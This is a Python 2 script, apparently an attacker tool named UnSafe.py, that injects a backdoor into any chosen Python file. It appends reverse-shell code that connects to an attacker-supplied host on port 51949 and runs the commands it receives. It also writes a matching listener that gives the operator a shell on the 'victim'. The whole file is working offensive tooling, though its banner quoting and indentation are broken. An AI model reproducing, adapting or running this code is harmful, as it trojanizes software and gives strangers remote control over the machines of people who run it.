#Software By HiCo Adam/NSK B3
import sys
print """        
                                                      
  __  __     __   __     ______     ______     ______   ______    
/\ \/\ \   /\ "-.\ \   /\  ___\   /\  __ \   /\  ___\ /\  ___\   
\ \ \_\ \  \ \ \-.  \  \ \___  \  \ \  __ \  \ \  __\ \ \  __\   
 \ \_____\  \ \_\\"\_\  \/\_____\  \ \_\ \_\  \ \_\    \ \_____\ 
  \/_____/   \/_/ \/_/   \/_____/   \/_/\/_/   \/_/     \/_____/ 
                                                                                                                   
						   
help = """
Original Software By NSK B3/HiCO Adam.
Drop A Backdoor into ANY (uncompiled) Python files you want!
This Generates A Server File As Well :)
------------------------------------------------------------

Usage:
python UnSafe.py [FILE] [LHOST]

_______________________________________________________________________.
FILE: File To Put A Backdoor into. [NOTE] Only .py Files Are Supported!|
                                                                       |
LHOST: The Listener Address                                            |
_______________________________________________________________________|

"""
def cli():
	global lhost, file
	try:
		file = sys.argv[1]
		lhost = sys.argv[2]
	except:
		print(help)
		quit()
def inject_backdoor():
	try:
		f = open(file, 'r')
	except:
		print("File %s not found!" % file)
		quit()
	if '.py' in file:
		pass
	else:
		print("The Given File Isn't A Python File!")
		quit()
	original_content = f.read()
	code = '''
import socket, subprocess
print "Loading, DO NOT EXIT THIS APPLICATION!"
host = "%s"\nport = 51949
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
while True:
	data = s.recv(65536)
	if 'quit' in data:
		quit()
	else:
		CMD = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		s.sendall(CMD.stdout.read())
		s.sendall(CMD.stderr.read())

\n''' % lhost
	BACKDOORED_CODE = str(original_content) + code
	wf = open(file, 'w')
	wf.write(BACKDOORED_CODE)
	file2 = open("reverse_tcp_server.py", "w")
        file2.write('''
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 51949
s.bind(("", port))
s.listen(50)
print "{+} TCP Server Started, waiting for client to connect..."
conn, addr = s.accept()
print "{*} Session Opened by Victim. PORT:",port
def command():
	while True:
		command = raw_input("[*] session@shell:~# ")
		if 'quit' in command:
			conn.send('quit')
			conn.close()
			s.close()
			quit()
		else:
			conn.send(command)
			print conn.recv(65536)
command()
''')


if __name__ == '__main__':
	cli()
	inject_backdoor()

